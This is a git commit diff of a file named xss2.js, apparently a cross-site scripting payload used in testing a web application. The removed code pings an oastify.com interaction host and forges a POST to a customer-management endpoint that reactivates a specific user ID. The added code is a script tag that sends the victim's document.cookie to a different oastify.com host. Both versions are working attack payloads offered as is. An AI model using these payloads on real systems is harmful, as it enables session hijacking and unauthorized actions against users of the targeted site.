310456ea37182f33de156417cb38af2b99b94d3d
spal-cf <96542761+spal-cf@users.noreply.github.com>
2025-06-11 17:48:08 -0400

    Update xss2.js

--- xss2.js
+++ xss2.js
@@ -1,14 +1,7 @@
-var i=new Image; i.src="https://00y1q322uivlldwo7uuqbm0d44avymmb.oastify.com/";
-
-fetch('/Home/ManageCustomer.asmx/ReactiveUser', {
-    method: 'POST',
-    headers: {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({ "userId": "109320" })
-})
-   .then(response => response.json())
-   .then(response => console.log(JSON.stringify(response)))
-
-
+<script>
+  fetch('https://sqmtgvsukaldb5mgxmki1eq5uw0nofc4.oastify.com', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+  });
+</script>
